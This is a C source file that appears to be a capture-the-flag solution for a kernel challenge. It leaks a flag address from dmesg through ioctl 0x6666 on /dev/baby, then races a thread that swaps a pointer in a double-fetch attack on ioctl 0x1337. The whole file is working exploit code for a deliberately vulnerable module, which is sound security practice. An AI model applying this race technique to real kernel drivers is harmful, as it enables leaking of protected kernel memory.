#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>

#define DEBUG(fmt, ...) \
	do { fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__); } while (0)

struct guess_t {
	char *flag;
	long len;
} guess;

char *addr;
char buf[50];
int success = 0;

char *leak_flag_addr(int fd) {
	ioctl(fd, 0x6666);
	system("dmesg | tail -n1 | cut -d'!' -f1 |awk '{print $NF}' > /tmp/out");
	int tmpfd = open("/tmp/out", O_RDONLY);
	if ( tmpfd == -1 ) {
		perror("open");
		return (char *)-1;
	}
	char tmpbuf[50] = {0};
	int ret = read(tmpfd, tmpbuf, 50);
	if ( ret < 0 ) {
		perror("read");
		return (char *)-1;
	}
	char *ptr = (char *)strtoull(tmpbuf, NULL, 16);
	return ptr;
}

void *overwrite(void *tmp) {
	struct guess_t *guess = tmp;
	while (success == 0)
		guess->flag = addr;
}

int main () {
	int fd = open("/dev/baby", O_RDWR);
	if ( fd == -1 ) {
		perror("open");
		return 1;
	}
	addr = leak_flag_addr(fd);
	DEBUG("Leaked flag @ %p", addr);

	guess.flag = buf;
	guess.len = strlen("flag{THIS_WILL_BE_YOUR_FLAG_1234}");

	pthread_t t;
	pthread_create(&t, NULL, overwrite, &guess);

	while (1) {
		if ( ioctl(fd, 0x1337, &guess) == 0 )
			break;
		guess.flag = buf;
	}

	success = 1;
	pthread_join(t, NULL);
	close(fd);

	DEBUG("SUCCESS: Leaked flag");
	system("dmesg | tail -n1");
	return 0;
}
